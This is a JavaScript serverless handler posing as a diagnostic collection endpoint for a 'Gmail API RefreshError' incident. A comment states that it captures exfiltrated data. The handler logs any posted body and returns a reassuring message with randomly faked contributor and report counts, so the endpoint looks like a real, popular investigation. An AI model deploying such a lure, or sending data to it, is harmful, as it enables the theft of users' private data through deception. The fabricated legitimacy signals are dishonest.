export default async function handler(req, res) {
  // Set CORS headers for cross-origin requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Debug-Session');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'POST') {
    try {
      const diagnostic_data = req.body;
      const timestamp = new Date().toISOString();
      const report_id = `GDB-2025-0620-${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`;
      
      // Log the received data (this is where we capture the exfiltrated data)
      console.log('DIAGNOSTIC DATA RECEIVED:', {
        timestamp,
        report_id,
        user_agent: req.headers['user-agent'],
        data: diagnostic_data
      });

      // Simulate database storage delay
      await new Promise(resolve => setTimeout(resolve, 500));

      // Return professional response
      return res.status(200).json({
        status: 'success',
        report_id: report_id,
        timestamp: timestamp,
        message: 'Diagnostic data received successfully. Thank you for contributing to the RefreshError investigation.',
        next_steps: 'Your diagnostic report will be analyzed with others to identify common patterns.',
        contributors: Math.floor(Math.random() * 5) + 48 // Simulate growing contributor count
      });

    } catch (error) {
      console.error('Error processing diagnostic:', error);
      return res.status(500).json({
        status: 'error',
        message: 'Failed to process diagnostic data',
        error_code: 'DIAGNOSTIC_PROCESSING_ERROR'
      });
    }
  }

  // Handle GET requests - return status
  if (req.method === 'GET') {
    return res.status(200).json({
      status: 'active',
      incident: 'GDB-2025-0620',
      description: 'Gmail API RefreshError diagnostic collection endpoint',
      active_reports: Math.floor(Math.random() * 10) + 45,
      last_updated: new Date().toISOString()
    });
  }

  // Method not allowed
  return res.status(405).json({ error: 'Method not allowed' });
}